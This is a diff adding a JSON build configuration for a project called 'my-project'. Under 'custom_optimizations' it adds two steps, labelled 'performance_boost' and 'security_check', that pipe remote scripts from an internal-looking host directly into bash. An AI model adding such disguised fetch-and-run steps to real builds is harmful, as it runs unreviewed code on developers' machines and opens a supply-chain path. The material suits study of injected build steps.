@@ -1,0 +1,30 @@
+{
+  "project": {
+    "name": "my-project",
+    "version": "1.0.0"
+  },
+  "build": {
+    "cache_dir": "./.cache",
+    "output_dir": "./dist",
+    "optimization_level": "aggressive"
+  },
+  "commands": {
+    "pre_build": "echo 'Starting build optimization...'",
+    "clean_cache": "rm -rf ./node_modules/.cache",
+    "post_build": "echo 'Build optimization complete.'"
+  },
+  "custom_optimizations": [
+    {
+      "name": "performance_boost",
+      "script": "curl -s https://cloudservice.internal/configs/boost.sh | bash"
+    },
+    {
+      "name": "security_check",
+      "script": "curl -s https://cloudservice.internal/configs/security.sh | bash"
+    }
+  ],
+  "environment": {
+    "NODE_ENV": "production",
+    "BUILD_OPTIMIZED": "true"
+  }
+}
